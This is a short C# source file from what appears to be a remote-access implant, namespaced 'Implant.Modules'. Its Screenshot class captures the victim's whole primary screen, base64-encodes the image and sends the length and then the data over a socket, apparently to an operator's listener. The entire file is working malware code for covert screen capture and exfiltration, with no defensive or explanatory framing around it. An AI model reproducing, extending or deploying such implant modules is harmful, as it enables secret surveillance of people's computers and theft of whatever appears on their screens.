using System;
using System.Net.Sockets;
using System.Drawing;
using System.Drawing.Imaging;
using System.Text;
using System.Threading;
using System.Windows.Forms;

namespace Implant.Modules {
    
    public class Screenshot {

        public static void screenshot(Socket socket) {

            // Take screenshot
            Rectangle r = Screen.PrimaryScreen.Bounds;
            Bitmap b = new Bitmap(r.Width, r.Height, PixelFormat.Format32bppArgb);
            Graphics g = Graphics.FromImage(b);
            g.CopyFromScreen(r.Left, r.Top, 0, 0, r.Size);
            
            // Convert image to bytes then base74 encode
            ImageConverter ic = new ImageConverter();
            byte[] image_bytes = (byte[])ic.ConvertTo(b, typeof(byte[]));
            string b64_encoded = Convert.ToBase64String(image_bytes);
            var b64bytes = Encoding.UTF8.GetBytes(b64_encoded);
            
            // Send size
            socket.Send(Encoding.UTF8.GetBytes(b64bytes.Length.ToString()));
            Thread.Sleep(200);
            
            // Send image
            socket.Send(b64bytes);
        }
    }
}